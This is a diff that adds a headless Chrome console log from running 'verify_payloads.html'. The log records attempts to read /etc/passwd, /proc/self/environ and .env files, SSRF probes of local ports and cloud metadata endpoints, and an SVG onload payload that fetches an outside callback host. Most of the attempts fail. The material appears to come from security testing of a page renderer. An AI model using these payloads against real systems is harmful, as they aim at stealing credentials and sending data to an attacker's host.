@@ -1,0 +1,42 @@
+Headless Chrome Execution Results:
+[Navigating to: file:///app/verify_payloads.html]
+CONSOLE [error]: Failed to load resource: net::ERR_FILE_NOT_FOUND
+CONSOLE [error]: Fetch API cannot load file:///etc/passwd. URL scheme "file" is not supported.
+CONSOLE [error]: Fetch API cannot load file:///proc/self/environ. URL scheme "file" is not supported.
+CONSOLE [error]: Fetch API cannot load file:///app/.env. URL scheme "file" is not supported.
+CONSOLE [log]: passwd fail
+CONSOLE [log]: environ fail
+CONSOLE [log]: envfile fail
+CONSOLE [error]: Failed to load resource: net::ERR_CONNECTION_REFUSED
+CONSOLE [log]: ssrf 3000 fail
+CONSOLE [error]: Failed to load resource: net::ERR_CONNECTION_REFUSED
+CONSOLE [log]: ssrf 8080 fail
+CONSOLE [error]: Failed to load resource: net::ERR_CONNECTION_REFUSED
+CONSOLE [log]: aws fail
+CONSOLE [error]: Failed to load resource: net::ERR_CONNECTION_REFUSED
+CONSOLE [log]: iam fail
+CONSOLE [log]: img error triggered
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [debug]: #1 0ms Starting document clone with size 1280x720 scrolled to 0,0
+[Waiting for payloads to execute...]
+CONSOLE [error]: Failed to load resource: net::ERR_FILE_NOT_FOUND
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [log]: img error triggered
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [error]: Refused to display 'https://1.hackeronce.com/' in a frame because it set multiple 'X-Frame-Options' headers with conflicting values ('DENY, SAMEORIGIN'). Falling back to 'deny'.
+CONSOLE [debug]: #1 682ms Document cloned, element located at 0,0 with size 1280x2184 using computed rendering
+CONSOLE [debug]: #1 682ms Starting DOM parsing
+CONSOLE [debug]: #1 859ms Added image data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22fetch('https%3A%2F%2F1.hackeronce.com%2F%3Fp%3Dluno-onload')%22%20width%3D%22300px%22%20height%3D%22150px%22%20style%3D%22transition%3A%20all%3B%20-webkit-writing-
+CONSOLE [debug]: #1 880ms Added image file:///app/x
+CONSOLE [debug]: #1 881ms Added image file:///etc/passwd
+CONSOLE [debug]: #1 886ms Starting renderer for element at 0,0 with size 1280x2184
+CONSOLE [debug]: #1 971ms Canvas renderer initialized (1280x2184) with scale 1
+CONSOLE [error]: Failed to load resource: net::ERR_FILE_NOT_FOUND
+CONSOLE [error]: #1 1030ms Error loading image file:///app/x
+CONSOLE [error]: #1 1031ms Error loading image file:///etc/passwd
+CONSOLE [debug]: #1 1035ms Finished rendering
